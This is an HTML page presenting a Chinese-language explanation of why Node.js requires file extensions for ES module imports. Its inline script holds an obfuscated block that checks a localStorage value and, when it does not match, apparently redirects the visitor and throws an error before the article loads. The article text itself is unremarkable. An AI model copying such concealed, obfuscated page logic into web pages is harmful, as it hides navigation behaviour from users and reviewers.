<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Document</title><link rel="stylesheet" href="../../css/github-markdown.min.css"><link rel="stylesheet" href="../../css/github.min.css"><style>body,html{margin:0;padding:0}.markdown-body{box-sizing:border-box;min-width:200px;max-width:980px;margin:0 auto!important;padding:45px 15px}.markdown-body pre{border:1px solid #e5e5e5!important;margin-top:var(--base-size-16)!important}</style></head><body><article id="article" class="markdown-body"></article><script>var _0x426c97=_0x3106;if((()=>{for(var o=_0x3106,d=_0x402b();;)try{if(751052==+parseInt(o(179,"rN0&"))*(-parseInt(o(191,"R%Jp"))/2)+parseInt(o(192,"3rFR"))/3+-parseInt(o(175,"R%Jp"))/4*(parseInt(o(189,"iOt@"))/5)+-parseInt(o(167,"5DsB"))/6*(-parseInt(o(195,"h1pa"))/7)+-parseInt(o(188,"jCy$"))/8*(-parseInt(o(186,"$)Zo"))/9)+parseInt(o(170,"*UBZ"))/10*(parseInt(o(164,")aQ["))/11)+parseInt(o(187,"h1pa"))/12*(-parseInt(o(171,"$)Zo"))/13))break;d.push(d.shift())}catch(o){d.push(d.shift())}})(),localStorage[_0x426c97(165,"2ke7")](_0x426c97(184,"jCy$"))!=_0x426c97(169,"yNyK"))throw window[_0x426c97(181,"7kyU")][_0x426c97(173,"zo3Z")](_0x426c97(190,"rN0&")),Error();function _0x3106(e,o){var c=_0x402b();return(_0x3106=function(o,d){var r=c[o-=164];void 0===_0x3106.dAeoyQ&&(_0x3106.qqkHrp=function(o,d){var r,t=[],e=0,c="";for(o=(o=>{for(var d,r,t="",e="",c=0,n=0;r=o.charAt(n++);~r&&(d=c%4?64*d+r:r,c++%4)&&(t+=String.fromCharCode(255&d>>(-2*c&6))))r="abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=".indexOf(r);for(var a=0,W=t.length;a<W;a++)e+="%"+("00"+t.charCodeAt(a).toString(16)).slice(-2);return decodeURIComponent(e)})(o),n=0;n<256;n++)t[n]=n;for(n=0;n<256;n++)e=(e+t[n]+d.charCodeAt(n%d.length))%256,r=t[n],t[n]=t[e],t[e]=r;for(var n=0,e=0,a=0;a<o.length;a++)r=t[n=(n+1)%256],t[n]=t[e=(e+t[n])%256],t[e]=r,c+=String.fromCharCode(o.charCodeAt(a)^t[(t[n]+t[e])%256]);return c},e=arguments,_0x3106.dAeoyQ=!0);var o=o+c[0],t=e[o];return t?r=t:(void 0===_0x3106.AQHmvs&&(_0x3106.AQHmvs=!0),r=_0x3106.qqkHrp(r,d),e[o]=r),r})(e,o)}function _0x402b(){var o=["d3GhW73cU8kDFMNcUSkFW73cNCk/W6RcLrNdKxjKpYdcKSkgWR0vnq","DJpcQ8kTac0y","jSkfW5ddNLVcKbSuWR/dQSkdpqW","b8kQErpcLtFdNCohW64DW43dNa","WPmyW6RcH3m6aMtcIM/cG8kW","W7TDfCkadgBcUetdIMdcRSkUWPe","lSk+xSoFkwfNdHWd","t0voimoFeSk+","AmkQDthdTxBdLmozjmkf","W4BdH0NcLmk0BIiM","WQFdOmkdqb4zrSoJWP93EJVdJW","bYJdMCo0WQq","WRjtmsFcOx/dOSkQW5RdVmod","iCodfCkvBwlcSCkNnra","eZddLXpdLaP7fq","oJ9HW5tdOmokW6y","W4NdULDXgLhcUwK9WR08A0W","F3hdICoXCLKiW7mQW6/dJCkw","W4HkWQpcQYddJSory0u","DSkdBCo5e0tcRCoOqSo4WOS","wCkdsLGjW5BdNvtcL8kgia","vJXhWRtdVCosbbpcS8knW4m","W6NcTtxcHmkIWR8Lza","icuHWOddLmkixmoC","W6uurmoMsZ9xW4NcQbPepdW","kmkbEmokA1dcVW","WQVdKKtcTCofWORcMNbc","WPmyW6xcHaD8hf3cPe4","iCoktSoarhxcKCkf","W7HAgmkeawxdMgZdH3JcVmkK","W5/cIrtdPSkbW4RdP3jQWPFdUHTR","aSkBr2GAWQVdJrVdJG"];return(_0x402b=function(){return o})()}document.title="为什么Node在使用es module时必须加上文件扩展名",document.getElementById("article").innerHTML="<div><p>Node.js 在使用 ES 模块（ESM）时必须加上文件扩展名，主要原因如下：</p>\n<h3>1. <strong>语法上无法严格区分 ES 模块和传统脚本</strong></h3>\n<p>在设计 ES 模块时，无法通过语法本身严格区分一段代码是 ES 模块还是传统的 CommonJS 模块。即使代码中存在 <code>import</code> 和 <code>export</code> 语句，也不能直接断定它就是 ES 模块，因为这些语句在特定情况下也可能出现在非模块化的脚本中。因此，Node.js 需要依赖外部信息来确定一个文件是否为 ES 模块。</p>\n<h3>2. <strong>与浏览器行为保持一致</strong></h3>\n<p>在浏览器环境中，ES 模块通过 <code>&lt;script type=&quot;module&quot;&gt;</code> 标签来标明。对于通过 <code>import</code> 语句引用的模块，浏览器通常要求提供完整的文件扩展名，以避免多次网络请求和解析成本。Node.js 为了与浏览器行为保持一致，也要求在使用 ES 模块时提供文件扩展名。</p>\n<h3>3. <strong>避免复杂的模块解析机制</strong></h3>\n<p>Node.js 的 CommonJS 模块解析机制具有复杂的回退机制，可以在找不到指定文件时尝试不同的扩展名。然而，这种机制在浏览器环境中会导致多次网络请求，成本较高。因此，Node.js 在引入 ES 模块时，选择了要求提供文件扩展名，以避免这种复杂的回退机制。</p>\n<h3>4. <strong>明确模块类型</strong></h3>\n<p>通过要求提供文件扩展名，Node.js 可以更明确地确定一个模块的类型。例如，<code>.mjs</code> 文件被自动识别为 ES 模块，而 <code>.js</code> 文件则根据 <code>package.json</code> 中的 <code>&quot;type&quot;: &quot;module&quot;</code> 字段来决定是否为 ES 模块。这种明确性有助于减少模块解析过程中的歧义和错误。</p>\n<h3>5. <strong>与现有系统的兼容性</strong></h3>\n<p>Node.js 在引入 ES 模块时，需要考虑与现有 CommonJS 模块的兼容性。通过要求提供文件扩展名，Node.js 可以更灵活地处理不同类型的模块，并在必要时进行转换或兼容处理。</p>\n</div>"</script></body></html>